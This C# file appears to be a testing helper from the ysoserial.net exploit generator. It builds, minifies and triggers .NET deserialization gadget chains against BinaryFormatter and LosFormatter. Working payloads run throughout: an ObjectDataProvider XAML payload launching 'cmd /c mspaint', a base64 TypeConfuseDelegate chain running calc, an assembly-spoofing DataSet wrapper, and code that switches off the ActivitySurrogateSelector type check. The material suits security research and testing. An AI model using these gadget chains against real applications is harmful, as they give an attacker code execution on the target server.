using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using NDesk.Options;
using ysoserial.Generators;
using System.IO;
using System.Diagnostics;
using Newtonsoft.Json.Linq;
using System.Text.RegularExpressions;
using ysoserial.Helpers.ModifiedVulnerableBinaryFormatters;
using System.Web.UI.WebControls;
using System.Configuration;
using System.Collections.Specialized;
using System.Reflection;
using System.Windows.Data;
using System.Runtime.Serialization;
using System.Drawing;

namespace ysoserial.Helpers.TestingArena
{
    // This can be used for testing purposes
    // Some samples have been included here
    class TestingArenaHome : GenericGenerator
    {
        private InputArgs inputArgs = new InputArgs();
        private InputArgs sampleInputArgs = new InputArgs("cmd /c mspaint", true, false, false, false, true, null);
        private string testarg = "";

        public override OptionSet Options()
        {
            OptionSet options = new OptionSet()
            {
                {"testarg", "This is a new string argument as an example", v => v = testarg},
            };

            return options;
        }

        public void Start(InputArgs inputArgs)
        {
            this.inputArgs = inputArgs;
            // Change the inputs in any ways
            //inputArgs.Minify = true;
            //inputArgs.UseSimpleType = true;

            // Add your function here perhaps - some examples:
            //MinimiseTCDJsonAndRun();
            //ManualTCDGPayload4Minifying();
            //TextFormatterMinifying();
            //ActivitySurrogateSelector();
            //SpoofByBinaryFormatterJson();
            //DisableActivitySurrogateSelectorTypeCheckReader();
            
            //Console.ReadLine();
        }

        private void DisableActivitySurrogateSelectorTypeCheckReader()
        {
            Console.WriteLine("Before - disableActivitySurrogateSelectorTypeCheck: " + System.Configuration.ConfigurationManager.AppSettings.Get("microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck"));

            var payload = @"<ObjectDataProvider MethodName=""Start"" IsInitialLoadEnabled=""False"" xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:sd=""clr-namespace:System.Diagnostics;assembly=System"" xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml"">
  <ObjectDataProvider.ObjectInstance>
    <sd:Process>
      <sd:Process.StartInfo>
        <sd:ProcessStartInfo Arguments=""/c mspaint"" StandardErrorEncoding=""{x:Null}"" StandardOutputEncoding=""{x:Null}"" UserName="""" Password=""{x:Null}"" Domain="""" LoadUserProfile=""False"" FileName=""cmd"" />
      </sd:Process.StartInfo>
    </sd:Process>
  </ObjectDataProvider.ObjectInstance>
</ObjectDataProvider>";


            sampleInputArgs = new InputArgs("cmd /c mspaint", true, false, true, false, true, new List<string>() { "--var", "2" });

            var serialized = (byte[]) new ActivitySurrogateDisableTypeCheckGenerator().GenerateWithInit("BinaryFormatter", sampleInputArgs);

            try
            {
                SerializersHelper.BinaryFormatter_deserialize(serialized);
            }
            catch(Exception e)
            {

            }

            Console.WriteLine("After - disableActivitySurrogateSelectorTypeCheck: " + System.Configuration.ConfigurationManager.AppSettings.Get("microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck"));

        }

        private class RestrictiveBinder : SerializationBinder
        {
            private static string s_allowedTypeName;
            private static string s_allowedAssemblyName;
            private static byte[] s_allowedToken;

            static RestrictiveBinder()
            {
                s_allowedTypeName = typeof(Bitmap).FullName;
                AssemblyName assemblyName = new AssemblyName(typeof(Bitmap).Assembly.FullName);
                if (assemblyName != null)
                {
                    s_allowedAssemblyName = assemblyName.Name;
                    s_allowedToken = assemblyName.GetPublicKeyToken();
                }
            }

            /// <summary>
            ///  Only safe to deserialize types are bypassing this callback, Strings 
            ///  and arrays of primitive types in particular. We are explicitly allowing
            ///  System.Drawing.Bitmap type to bind using the default binder.
            /// </summary>
            /// <param name="assemblyName"></param>
            /// <param name="typeName"></param>
            /// <returns></returns>
            public override Type BindToType(string assemblyName, string typeName)
            {
                if (string.CompareOrdinal(typeName, s_allowedTypeName) == 0)
                {
                    AssemblyName nameToBind = null;
                    try
                    {
                        nameToBind = new AssemblyName(assemblyName);
                    }
                    catch
                    {
                    }
                    if (nameToBind != null)
                    {
                        if (string.CompareOrdinal(nameToBind.Name, s_allowedAssemblyName) == 0)
                        {
                            byte[] tokenToBind = nameToBind.GetPublicKeyToken();
                            if ((tokenToBind != null) &&
                                (s_allowedToken != null) &&
                                (tokenToBind.Length == s_allowedToken.Length))
                            {
                                bool block = false;
                                for (int i = 0; i < s_allowedToken.Length; i++)
                                {
                                    if (s_allowedToken[i] != tokenToBind[i])
                                    {
                                        block = true;
                                        break;
                                    }
                                }
                                if (!block)
                                {
                                    return null;
                                }
                            }
                        }
                    }
                }
                throw new Exception("!");
            }
        }

        private void SpoofByBinaryFormatterJson()
        {
            /*
            Bitmap bitmap = new Bitmap(@"c:\pixel.jpg");

            System.Runtime.Serialization.Formatters.Binary.BinaryFormatter fmt1 = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
            MemoryStream lsMs = new MemoryStream();
            fmt1.Serialize(lsMs, bitmap);
            lsMs.Position = 0;

            string tcd_json = AdvancedBinaryFormatterParser.StreamToJson(lsMs, false, true, true);

            Console.WriteLine(tcd_json);
            Console.ReadLine();
            */

            string fromJsonWithSpoofedAssembly = @"[{'Id': 1,
    'Data': {
      '$type': 'SerializationHeaderRecord',
      'binaryFormatterMajorVersion': 1,
      'binaryFormatterMinorVersion': 0,
      'binaryHeaderEnum': 0,
      'topId': 1,
      'headerId': -1,
      'majorVersion': 1,
      'minorVersion': 0
}},{'Id': 2,
    'TypeName': 'Assembly',
    'Data': {
      '$type': 'BinaryAssembly',
      'assemId': 2,
      'assemblyString': 'System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
}},{'Id': 3,
    'TypeName': 'Assembly',
    'Data': {
      '$type': 'BinaryAssembly',
      'assemId': 3,
      'assemblyString': 'System.Data'
}},{'Id': 4,
    'TypeName': 'ObjectWithMapTypedAssemId',
    'Data': {
      '$type': 'BinaryObjectWithMapTyped',
      'binaryHeaderEnum': 5,
      'objectId': 1,
      'name': 'System.Data.DataSet, System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
      'numMembers': 10,
      'memberNames':['DataSet.RemotingFormat','DataSet.DataSetName','DataSet.Namespace','DataSet.Prefix','DataSet.CaseSensitive','DataSet.LocaleLCID','DataSet.EnforceConstraints','DataSet.ExtendedProperties','DataSet.Tables.Count','DataSet.Tables_0'],
      'binaryTypeEnumA':[4,1,1,1,0,0,0,2,0,7],
      'typeInformationA':[null,null,null,null,1,8,1,null,8,2],
      'typeInformationB':['System.Data.X',null,null,null,1,8,1,null,8,2],
      'memberAssemIds':[3,0,0,0,0,0,0,0,0,0],
      'assemId': 2
}},{'Id': 5,
    'TypeName': 'ObjectWithMapTypedAssemId',
    'Data': {
      '$type': 'BinaryObjectWithMapTyped',
      'binaryHeaderEnum': 5,
      'objectId': -4,
      'name': 'System.Data.SerializationFormat',
      'numMembers': 1,
      'memberNames':['value__'],
      'binaryTypeEnumA':[0],
      'typeInformationA':[8],
      'typeInformationB':[8],
      'memberAssemIds':[0],
      'assemId': 3
}},{'Id': 6,
    'TypeName': 'Int32',
    'IsPrimitive': true,
    'Data': {
      '$type': 'MemberPrimitiveUnTyped',
      'typeInformation': 8,
      'value': 1
}},{'Id': 7,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 5,
      'value': ''
}},{'Id': 8,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 5
}},{'Id': 9,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 5
}},{'Id': 10,
    'TypeName': 'Boolean',
    'IsPrimitive': true,
    'Data': {
      '$type': 'MemberPrimitiveUnTyped',
      'typeInformation': 1,
      'value': false
}},{'Id': 11,
    'TypeName': 'Int32',
    'IsPrimitive': true,
    'Data': {
      '$type': 'MemberPrimitiveUnTyped',
      'typeInformation': 8,
      'value': 1033
}},{'Id': 12,
    'TypeName': 'Boolean',
    'IsPrimitive': true,
    'Data': {
      '$type': 'MemberPrimitiveUnTyped',
      'typeInformation': 1,
      'value': false
}},{'Id': 13,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 1
}},{'Id': 14,
    'TypeName': 'Int32',
    'IsPrimitive': true,
    'Data': {
      '$type': 'MemberPrimitiveUnTyped',
      'typeInformation': 8,
      'value': 1
}},{'Id': 15,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 6
}},{'Id': 16,
    'TypeName': 'ArraySinglePrimitive',
    'ArrayBytes': 'AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAAcvYyBjYWxjBgcAAAADY21kBAUAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHbWV0aG9kMAdtZXRob2QxAwMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkIAAAACQkAAAAJCgAAAAQIAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BgsAAACwAlN5c3RlbS5GdW5jYDNbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GDAAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkKBg0AAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYOAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzBg8AAAAFU3RhcnQJEAAAAAQJAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQkPAAAACQ0AAAAJDgAAAAYUAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhUAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEKAAAACQAAAAYWAAAAB0NvbXBhcmUJDAAAAAYYAAAADVN5c3RlbS5TdHJpbmcGGQAAACtJbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhoAAAAyU3lzdGVtLkludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEQAAAACAAAAAYbAAAAcVN5c3RlbS5Db21wYXJpc29uYDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCQwAAAAKCQwAAAAJGAAAAAkWAAAACgs=',
    'Data': {
      '$type': 'BinaryArray',
      'objectId': 6,
      'rank': 1,
      'lengthA':[2240],
      'lowerBoundA':[0],
      'binaryTypeEnum': 0,
      'typeInformation': 2,
      'assemId': 0,
      'binaryHeaderEnum': 15,
      'binaryArrayTypeEnum': 0
}},{'Id': 17,
    'TypeName': 'MessageEnd',
    'Data': {
      '$type': 'MessageEnd'
}}]";

            MemoryStream ms = AdvancedBinaryFormatterParser.JsonToStream(fromJsonWithSpoofedAssembly);
            try
            {
                System.Runtime.Serialization.Formatters.Binary.BinaryFormatter fmt = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
                //fmt.Binder = new RestrictiveBinder();
                Console.WriteLine(Convert.ToBase64String(ms.ToArray()));
                ms.Position = 0;
                fmt.Deserialize(ms);
                //SerializersHelper.BinaryFormatter_deserialize(ms.ToArray());
            }
            catch
            {
                Console.WriteLine("Error");
            }
        }
        private void ActivitySurrogateSelector()
        {
            string myApp = "TestConsoleApp_YSONET";
            sampleInputArgs = new InputArgs(myApp + " /foo bar", true, true, true, true, true, null);
            bool isErrOk = false;

            PayloadClass myPayloadClass = new PayloadClass(1, sampleInputArgs);

            List<object> ls = myPayloadClass.GadgetChains();
            //*
            // Disable ActivitySurrogate type protections during generation
            ConfigurationManager.AppSettings.Set("microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck", "true");

            //Serialize(myPayloadClass, "BinaryFormatter", sampleInputArgs);
            MemoryStream lsMs = new MemoryStream();

            System.Runtime.Serialization.Formatters.Binary.BinaryFormatter fmt = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
            fmt.SurrogateSelector = new MySurrogateSelector();
            fmt.Serialize(lsMs, ls);
            //lsMs.Position = 0;
            //fmt.Deserialize(lsMs);
            
            byte[] bf_byte = lsMs.ToArray();
            Console.WriteLine("Init size: " + bf_byte.Length);
            string json_string = AdvancedBinaryFormatterParser.StreamToJson(new MemoryStream(bf_byte), false, true, true);

            //MemoryStream msCanIt = AdvancedBinaryFormatterParser.JsonToStream(json_string);
            //msCanIt.Position = 0;
            //fmt.Deserialize(msCanIt);

            string result = BinaryFormatterMinifier.MinimiseJsonAndRun(json_string, sampleInputArgs, isErrOk, true);

            Console.WriteLine(result);
            MemoryStream ms = AdvancedBinaryFormatterParser.JsonToStream(result);
            Console.WriteLine("Final size: " + ms.Length);
            Console.ReadLine();

        }

        private void TextFormatterMinifying()
        {
            string myApp = "TestConsoleApp_YSONET";
            sampleInputArgs = new InputArgs(myApp + " /foo bar", true, false, true, true, true, null);
            bool isErrOk = false;

            TextFormattingRunPropertiesGenerator generator = new TextFormattingRunPropertiesGenerator();
            byte[] tcd_bf_byte = (byte[])generator.GenerateWithNoTest("binaryformatter", sampleInputArgs);
            Console.WriteLine("Init size: " + tcd_bf_byte.Length);
            string json_string = AdvancedBinaryFormatterParser.StreamToJson(new MemoryStream(tcd_bf_byte), false, true, true);

            string result = BinaryFormatterMinifier.MinimiseJsonAndRun(json_string, sampleInputArgs, isErrOk, true);
            Console.WriteLine(result);
            MemoryStream ms = AdvancedBinaryFormatterParser.JsonToStream(result);
            Console.WriteLine("Final size: " + ms.Length);
            Console.ReadLine();

        }

        // this has been used as an example to minify the TypeConfuseDelegateGenerator payload!
        private void MinimiseTCDJsonAndRun()
        {
            string myApp = "TestConsoleApp_YSONET";
            sampleInputArgs = new InputArgs(myApp + " /foo bar", true, false, false, false, true, null);
            bool isErrOk = false;
            
            TypeConfuseDelegateGenerator tcdg = new TypeConfuseDelegateGenerator();
            byte[] tcd_bf_byte = (byte[])tcdg.GenerateWithNoTest("binaryformatter", sampleInputArgs);
            string json_string = AdvancedBinaryFormatterParser.StreamToJson(new MemoryStream(tcd_bf_byte), false, true, true);

            byte[] result = BinaryFormatterMinifier.MinimiseBFAndRun(tcd_bf_byte, sampleInputArgs, isErrOk, true);

            Console.WriteLine(Encoding.UTF8.GetString(result));
            Console.ReadLine();
        }

        private void ManualTCDGPayload4Minifying()
        {


            /*
            sampleInputArgs.Minify = true;
            sampleInputArgs.UseSimpleType = true;

            object tcd = TypeConfuseDelegateGenerator.TypeConfuseDelegateGadget(sampleInputArgs);

            TypeConfuseDelegateGenerator tcdg = new TypeConfuseDelegateGenerator();
            byte[] tcd_bf_byte = (byte[]) tcdg.GenerateWithNoTest("binaryformatter", sampleInputArgs);
            string tcd_json = AdvancedBinaryFormatterParser.StreamToJson(new MemoryStream(tcd_bf_byte),false, true);
            Console.WriteLine(tcd_json);
            //*/

            //*
            string tcd_json = @"[{'Id': 1,
    'Data': {
      '$type': 'SerializationHeaderRecord',
      'binaryFormatterMajorVersion': 1,
      'binaryFormatterMinorVersion': 0,
      'binaryHeaderEnum': 0,
      'topId': 1,
      'headerId': -1,
      'majorVersion': 1,
      'minorVersion': 0
}},{'Id': 2,
    'TypeName': 'Assembly',
    'Data': {
      '$type': 'BinaryAssembly',
      'assemId': 2,
      'assemblyString': 'System'
}},{'Id': 3,
    'TypeName': 'ObjectWithMapTypedAssemId',
    'Data': {
      '$type': 'BinaryObjectWithMapTyped',
      'binaryHeaderEnum': 5,
      'objectId': 1,
      'name': 'System.Collections.Generic.SortedSet`1[[System.String,mscorlib]]',
      'numMembers': 4,
      'memberNames':['Count','Comparer','Version','Items'],
      'binaryTypeEnumA':[0,1,0,1],
      'typeInformationA': null,
      'typeInformationB':[8,null,8,null],
      'memberAssemIds':[0,0,0,0],
      'assemId': 2
}},{'Id': 4,
    'TypeName': 'Int32',
    'IsPrimitive': true,
    'Data': {
      '$type': 'MemberPrimitiveUnTyped',
      'typeInformation': 8,
      'value': 2
}},{'Id': 5,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 3
}},{'Id': 6,
    'TypeName': 'Int32',
    'IsPrimitive': true,
    'Data': {
      '$type': 'MemberPrimitiveUnTyped',
      'typeInformation': 8,
      'value': 0
}},{'Id': 7,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 4
}},{'Id': 8,
    'TypeName': 'ObjectWithMapTyped',
    'Data': {
      '$type': 'BinaryObjectWithMapTyped',
      'binaryHeaderEnum': 4,
      'objectId': 3,
      'name': 'System.Collections.Generic.ComparisonComparer`1[[System.String]]',
      'numMembers': 1,
      'memberNames':['_comparison'],
      'binaryTypeEnumA':[1],
      'typeInformationA': null,
      'typeInformationB':[null],
      'memberAssemIds':[0],
      'assemId': 0
}},{'Id': 9,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 5
}},{'Id': 10,
    'TypeName': 'ArraySingleString',
    'Data': {
      '$type': 'BinaryArray',
      'objectId': 4,
      'rank': 0,
      'lengthA':[2],
      'lowerBoundA': null,
      'binaryTypeEnum': 0,
      'typeInformation': null,
      'assemId': 0,
      'binaryHeaderEnum': 17,
      'binaryArrayTypeEnum': 0
}},{'Id': 11,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 6,
      'value': '/foo bar'
}},{'Id': 12,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 7,
      'value': 'TestConsoleApp_YSONET'
}},{'Id': 13,
    'TypeName': 'ObjectWithMapTyped',
    'Data': {
      '$type': 'BinaryObjectWithMapTyped',
      'binaryHeaderEnum': 4,
      'objectId': 5,
      'name': 'System.DelegateSerializationHolder',
      'numMembers': 3,
      'memberNames':['Delegate','','x'],
      'binaryTypeEnumA':[1,1,1],
      'typeInformationA': null,
      'typeInformationB':[null,null,null],
      'memberAssemIds':[0,0,0],
      'assemId': 0
}},{'Id': 14,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 8
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 17,
    'TypeName': 'ObjectWithMapTyped',
    'Data': {
      '$type': 'BinaryObjectWithMapTyped',
      'binaryHeaderEnum': 4,
      'objectId': 8,
      'name': 'System.DelegateSerializationHolder+DelegateEntry',
      'numMembers': 7,
      'memberNames':['type','assembly','','targetTypeAssembly','targetTypeName','methodName','delegateEntry'],
      'binaryTypeEnumA':[1,1,1,1,1,1,1],
      'typeInformationA': null,
      'typeInformationB':[null,null,null,null,null,null,null],
      'memberAssemIds':[0,0,0,0,0,0,0],
      'assemId': 0
}},{'Id': 18,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 11,
      'value': 'System.Func`3[[System.String],[System.String],[System.Diagnostics.Process,System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089]]'
}},{'Id': 19,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 12,
      'value': 'mscorlib'
}},{'Id': 20,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 21,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 13,
      'value': 'System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089'
}},{'Id': 22,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 14,
      'value': 'System.Diagnostics.Process'
}},{'Id': 23,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 15,
      'value': 'Start'
}},{'Id': 24,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 16
}},{'Id': 25,
    'TypeName': 'ObjectWithMapTyped',
    'Data': {
      '$type': 'BinaryObjectWithMapTyped',
      'binaryHeaderEnum': 4,
      'objectId': 9,
      'name': 'x',
      'numMembers': 7,
      'memberNames':['','','','','','',''],
      'binaryTypeEnumA':[1,1,1,1,1,0,1],
      'typeInformationA': null,
      'typeInformationB':[null,null,null,null,null,8,null],
      'memberAssemIds':[0,0,0,0,0,0,0],
      'assemId': 0
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 31,
    'TypeName': 'Int32',
    'IsPrimitive': true,
    'Data': {
      '$type': 'MemberPrimitiveUnTyped',
      'typeInformation': 8,
      'value': 0
}},{'Id': 33,
    'TypeName': 'Object',
    'Data': {
      '$type': 'BinaryObject',
      'objectId': 10,
      'mapId': 9
}},{'Id': 34,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 22,
      'value': 'Compare'
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 36,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 24,
      'value': 'System.String'
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 39,
    'TypeName': 'Int32',
    'IsPrimitive': true,
    'Data': {
      '$type': 'MemberPrimitiveUnTyped',
      'typeInformation': 8,
      'value': 0
}},{'Id': 40,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 41,
    'TypeName': 'Object',
    'Data': {
      '$type': 'BinaryObject',
      'objectId': 16,
      'mapId': 8
}},{'Id': 42,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 27,
      'value': 'System.Comparison`1[[System.String]]'
}},{'Id': 43,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 12
}},{'Id': 44,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 45,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 12
}},{'Id': 46,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 24
}},{'Id': 47,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 22
}},{'Id': 49,
    'TypeName': 'MessageEnd',
    'Data': {
      '$type': 'MessageEnd'
}}]";

            MemoryStream ms = AdvancedBinaryFormatterParser.JsonToStream(tcd_json);
            try
            {
                string lfStr = Encoding.UTF8.GetString(SimpleMinifiedObjectLosFormatter.BFStreamToLosFormatterStream(ms).ToArray());
                Console.WriteLine("Length: " + lfStr.Length);
                SerializersHelper.LosFormatter_deserialize(lfStr);
            }
            catch
            {
                Console.WriteLine("Error");
            }

            //*/

        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            throw new NotImplementedException();
        }

        public override string Finders()
        {
            throw new NotImplementedException();
        }

        public override string Name()
        {
            throw new NotImplementedException();
        }

        public override List<string> SupportedFormatters()
        {
            throw new NotImplementedException();
        }
    }
}
